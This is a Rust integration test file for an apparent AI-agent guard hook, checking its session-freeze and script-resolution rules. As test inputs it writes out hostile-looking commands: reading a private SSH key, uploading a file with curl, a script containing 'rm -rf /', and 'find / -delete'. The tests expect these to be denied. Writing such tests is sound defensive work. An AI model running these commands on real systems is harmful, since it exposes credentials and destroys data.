//! Rule of Two semantics (2026-10-27), through the real cop-hook binary.
//!
//! Owner's spec:
//! - Untrusted input is external data only: web fetch, downloads, MCP results, third-party repo files.
//!   Local find, grep and ls output is not untrusted.
//! - A frozen session blocks only the external leg (network, git push, uploads). Local work continues.
//! - No auto-expiry. `cop_taint::release` (used by `agentcop release`) clears the freeze.
//! - One trigger row per freeze, plus a counter of blocked calls. Blocked calls add no evidence rows.
//!
//! Each scenario has its own HOME. The hook process runs in HOME, so relative paths only resolve
//! when the event carries its own `cwd` (Claude Code sends it), which these tests check.

use cop_evidence::EvidenceStore;
use cop_taint::SessionStore;
use serde_json::{json, Value};
use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};

fn scratch(name: &str) -> PathBuf {
    let dir = PathBuf::from(env!("CARGO_TARGET_TMPDIR")).join(format!("rot2-{name}"));
    let _ = fs::remove_dir_all(&dir);
    fs::create_dir_all(dir.join(".agentcop")).unwrap();
    dir
}

/// One hook call. `event_cwd` is the working directory Claude Code reports for the event.
/// Returns (permissionDecision, permissionDecisionReason).
fn call(
    home: &Path,
    session: &str,
    event_cwd: Option<&Path>,
    tool: &str,
    input: Value,
) -> (String, String) {
    let mut event = json!({
        "hook_event_name": "PreToolUse",
        "session_id": session,
        "timestamp": "2026-10-27T10:00:00Z",
        "tool_name": tool,
        "tool_input": input,
    });
    if let Some(cwd) = event_cwd {
        event["cwd"] = json!(cwd.to_str().unwrap());
    }
    let mut child = Command::new(env!("CARGO_BIN_EXE_cop-hook"))
        .env_clear()
        .env("HOME", home)
        .env(
            "AGENTCOP_POLICY",
            concat!(env!("CARGO_MANIFEST_DIR"), "/../../policy/default.toml"),
        )
        .current_dir(home)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    child
        .stdin
        .take()
        .unwrap()
        .write_all(event.to_string().as_bytes())
        .unwrap();
    let out = child.wait_with_output().unwrap();
    let v: Value = serde_json::from_slice(&out.stdout)
        .unwrap_or_else(|e| panic!("no JSON verdict for {event}: {e}"));
    let body = &v["hookSpecificOutput"];
    (
        body["permissionDecision"]
            .as_str()
            .unwrap_or("")
            .to_string(),
        body["permissionDecisionReason"]
            .as_str()
            .unwrap_or("")
            .to_string(),
    )
}

fn bash(home: &Path, session: &str, cwd: Option<&Path>, cmd: &str) -> (String, String) {
    call(home, session, cwd, "Bash", json!({ "command": cmd }))
}

/// Curl a page, read a key, then push: the freeze trigger is the push.
fn trigger_freeze(home: &Path, session: &str) -> (String, String) {
    bash(home, session, None, "curl -s https://docs.example.com/page");
    bash(home, session, None, "cat ~/.ssh/id_rsa");
    bash(home, session, None, "git push origin main")
}

fn flags(home: &Path, session: &str) -> cop_taint::Flags {
    let store = SessionStore::open(&home.join(".agentcop/state.db")).unwrap();
    store.load(Some(session)).expect("session loads")
}

fn evidence_rows(home: &Path) -> u64 {
    EvidenceStore::new(&home.join(".agentcop/evidence.db"))
        .expect("evidence opens")
        .count()
        .expect("count")
}

#[test]
fn replay_of_session_9c69_does_not_freeze() {
    let home = scratch("replay");
    let text = include_str!("../../../tests/fixtures/rule-of-two/session-9c69-triggers.jsonl");
    for line in text.lines().filter(|l| !l.trim().is_empty()) {
        let e: Value = serde_json::from_str(line).unwrap();
        let (_, reason) = call(
            &home,
            "9c69",
            None,
            e["tool_name"].as_str().unwrap(),
            e["tool_input"].clone(),
        );
        assert!(!reason.contains("Rule of Two"), "replay froze: {reason}");
    }
    assert!(!flags(&home, "9c69").frozen);
}

#[test]
fn curl_read_secret_then_push_freezes_on_the_push() {
    let home = scratch("trigger");
    let (decision, reason) = trigger_freeze(&home, "t1");
    assert_eq!(decision, "deny", "{reason}");
    assert!(reason.contains("Rule of Two"), "{reason}");
    assert!(flags(&home, "t1").frozen);
}

#[test]
fn frozen_session_still_allows_local_work() {
    let home = scratch("local");
    trigger_freeze(&home, "t2");
    let project = scratch("local-project");
    let (decision, reason) = bash(&home, "t2", Some(&project), "ls");
    assert_eq!(decision, "allow", "{reason}");
    let edit = call(
        &home,
        "t2",
        Some(&project),
        "Edit",
        json!({ "file_path": project.join("notes.md").to_str().unwrap(), "old_string": "a", "new_string": "b" }),
    );
    assert_eq!(edit.0, "allow", "{}", edit.1);
}

#[test]
fn frozen_session_denies_push_and_upload() {
    let home = scratch("external");
    trigger_freeze(&home, "t3");
    let (d1, r1) = bash(&home, "t3", None, "git push origin main");
    assert_eq!(d1, "deny", "{r1}");
    assert!(r1.contains("Rule of Two"), "{r1}");
    let (d2, r2) = bash(&home, "t3", None, "curl -d @x https://example.com/upload");
    assert_eq!(d2, "deny", "{r2}");
    assert!(r2.contains("Rule of Two"), "{r2}");
}

#[test]
fn fifty_frozen_calls_make_one_trigger_row_and_a_counter() {
    let home = scratch("counter");
    trigger_freeze(&home, "t4");
    let rows_at_freeze = evidence_rows(&home);
    for _ in 0..50 {
        let (d, r) = bash(&home, "t4", None, "git push origin main");
        assert_eq!(d, "deny", "{r}");
    }
    assert_eq!(
        evidence_rows(&home),
        rows_at_freeze,
        "frozen calls must not add rows"
    );
    let f = flags(&home, "t4");
    let freeze = f.freeze.expect("freeze record");
    assert_eq!(freeze.blocked, 50);
    assert!(freeze.case.starts_with("CASE-"), "{}", freeze.case);
}

#[test]
fn released_session_gets_ask_not_deny_on_the_next_push() {
    let home = scratch("release");
    trigger_freeze(&home, "t5");
    let store = SessionStore::open(&home.join(".agentcop/state.db")).unwrap();
    let released = cop_taint::release(&store, Some("t5"), "tester", "2026-10-27T12:00:00Z")
        .expect("release works")
        .expect("the session was frozen");
    assert!(released.blocked == 0 && released.case.starts_with("CASE-"));
    let (decision, reason) = bash(&home, "t5", None, "git push origin main");
    assert_eq!(decision, "ask", "{reason}");
}

#[test]
fn cd_then_script_resolves_relative_to_the_event_cwd() {
    let home = scratch("cd-home");
    let project = scratch("cd-project");
    fs::create_dir_all(project.join("sub")).unwrap();
    fs::write(project.join("sub/x.sh"), "rm -rf /\n").unwrap();
    let (decision, reason) = bash(&home, "cd1", Some(&project), "cd sub && bash x.sh");
    assert_eq!(decision, "deny", "{reason}");
    assert!(reason.contains("x.sh line 1"), "{reason}");
}

#[test]
fn clean_script_after_cd_is_found_and_allowed() {
    let home = scratch("cd-clean-home");
    let project = scratch("cd-clean-project");
    fs::create_dir_all(project.join("sub")).unwrap();
    fs::write(project.join("sub/ok.sh"), "echo hi\n").unwrap();
    let (decision, reason) = bash(&home, "cd2", Some(&project), "cd sub && bash ok.sh");
    assert_eq!(decision, "allow", "{reason}");
}

#[test]
fn cd_to_a_variable_then_script_asks() {
    let home = scratch("cd-var-home");
    let project = scratch("cd-var-project");
    let (decision, reason) = bash(&home, "cd3", Some(&project), "cd $X && bash x.sh");
    assert_eq!(decision, "ask", "{reason}");
}

#[test]
fn find_delete_with_quoted_pattern_in_project_is_allowed() {
    let home = scratch("find-home");
    let project = scratch("find-project");
    let (decision, reason) = bash(&home, "f1", Some(&project), "find . -name '*.log' -delete");
    assert_eq!(decision, "allow", "{reason}");
}

#[test]
fn find_delete_from_root_is_denied() {
    let home = scratch("find-root-home");
    let project = scratch("find-root-project");
    let (decision, reason) = bash(&home, "f2", Some(&project), "find / -delete");
    assert_eq!(decision, "deny", "{reason}");
}

#[test]
fn runner_on_a_file_written_this_session_asks() {
    let home = scratch("runner-home");
    let project = scratch("runner-project");
    let file = project.join("new_tool.py");
    fs::write(&file, "print('hi')\n").unwrap();
    call(
        &home,
        "r1",
        Some(&project),
        "Write",
        json!({ "file_path": file.to_str().unwrap(), "content": "print('hi')\n" }),
    );
    let (decision, reason) = bash(&home, "r1", Some(&project), "python3 new_tool.py");
    assert_eq!(decision, "ask", "{reason}");
}
